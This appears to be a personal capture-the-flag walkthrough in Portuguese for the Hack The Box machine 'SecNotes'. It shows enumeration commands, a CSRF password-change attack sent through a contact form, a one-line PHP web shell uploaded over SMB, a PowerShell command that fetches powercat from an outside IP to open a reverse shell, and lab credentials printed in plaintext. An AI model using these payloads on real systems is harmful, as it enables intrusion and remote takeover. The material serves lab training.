SecNotes
========================

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn secnotes.htb | tee nmap_udp_output.txt

![qownnotes-media-JtBsKJ](../../../media/qownnotes-media-JtBsKJ.png)

    enum4linux -a -A 10.10.10.97

![qownnotes-media-nPDgBY](../../../media/qownnotes-media-nPDgBY.png)

    smbclient -L //10.10.10.97 -U '' -N

![qownnotes-media-flXQoK](../../../media/qownnotes-media-flXQoK.png)

    sudo nmap -p- -Pn -T5 -n secnotes.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-TsRKJZ](../../../media/qownnotes-media-TsRKJZ.png)

    gobuster dir -u http://secnotes.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_80_gobuster.txt"
    

    gobuster dir -u http://secnotes.htb:8808 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_8808_gobuster.txt"
    
    nikto -host http://secnotes.htb -T x 6 | tee nikto_80_output.txt
    
    gobuster dir -u http://secnotes.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_80_gobuster.txt" -c "PHPSESSID=pgpgdgeivans82jmjdig530tjq"
    
    gobuster dir -u http://secnotes.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"
 
 Nenhum desses funcionou, mas temos um problema de SQL injection na aplicacao. Porque,l pelo comportamento que a aplicacao apresentavaa, era de se chegar nessa conclusao. Porem eu fui ver a resposta e ver se eu tinha deixado algo passar. A questao do SQL Injection era real, porem teve algo que eu sequer tive ideia de testar. No Contact Us tem um formulario que eu posso enviar uma mensagem e, tambem na resposta eu vi que a troca de senha aceita a nova senha em metodo GET:
 
 http://secnotes.htb/change_pass.php?password=44366603&confirm_password=44366603&submit=submit
 
Claro que nesse caso precisa ter o cookie de sessao do usuario:

    curl 'http://secnotes.htb/change_pass.php?password=44366603&confirm_password=44366603&submit=submit' -H 'Cookie: PHPSESSID=pgpgdgeivans82jmjdig530tjq' -vv
    
 ![qownnotes-media-rhCtsE](../../../media/qownnotes-media-rhCtsE.png)

Nesse cenario, ja temos um cenario de exploracao

# Exploitation

O aprendizado neste CTF eh interessante pelo fato de que existe uma interacao de usuario no momento do Contact Us (formulario). A vitima clica no link que enviamos a ela. Sendo assim, podemos seguir o seguintes passos...

![qownnotes-media-GzAFXm](../../../media/qownnotes-media-GzAFXm.png)

Depois de um tempo, ja podemos esperar que o usuario clique no link que enviamos:

tyler
44366603

A nova credencial e vemos que conseguimos entrar na aplicacao

![qownnotes-media-EMTMGl](../../../media/qownnotes-media-EMTMGl.png)

tyler
92g!mA8BGjOirkL%OG*&

![qownnotes-media-rkYhjf](../../../media/qownnotes-media-rkYhjf.png)

Aqui foi um detalhe bem besta que fez eu ficar sem progredir com o comprometimento da máquina. Dos payloads que tentei, todos eram aspx e, no entanto, o servidor estava configurado para suportar aplicações em PHP. Só depois que subi uma webshell em php que consegui a shell da máquina:


    smbclient \\10.10.10.97\new-site -U tyler
    
    put webshell.php
    
    firefox http://secnotes.htb:8808/webshell.php?cmd=powershell%20-c%20%22IEX(New-Object%20System.Net.WebClient).DownloadString(%27http://10.10.14.4/powercat.ps1%27);powercat%20-c%2010.10.14.4%20-p%208082%20-e%20powershell%22


    cat webshell.php
    <?php system($_REQUEST['cmd']); ?>

# Privilege Escalation


    wmic service get name,displayname,pathname,startmode

    sc.exe query

![qownnotes-media-tYSoJs](../../../media/qownnotes-media-tYSoJs.png)


    where.exe /R c:\ bash.exe
    c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
    python -c 'import pty;pty.spawn("/bin/bash")';

![qownnotes-media-ilxvDj](../../../media/qownnotes-media-ilxvDj.png)
Note que d u um problema na shell que eu abri, dado que a tecla enter estava enviando dois caracteres: \n\r. Então para ter condições de executar um comando válido, era necessário colocar um ";" para evitar o erro. Dessa forma o \r ficava como um segundo comando.

O aprendizado dessa máquina eo seguinte... Nesse caso, a credencial estava dentro de uma máquina virtual dentro do windows, no qual se encontrava no history



![qownnotes-media-KmCtqE](../../../media/qownnotes-media-KmCtqE.png)

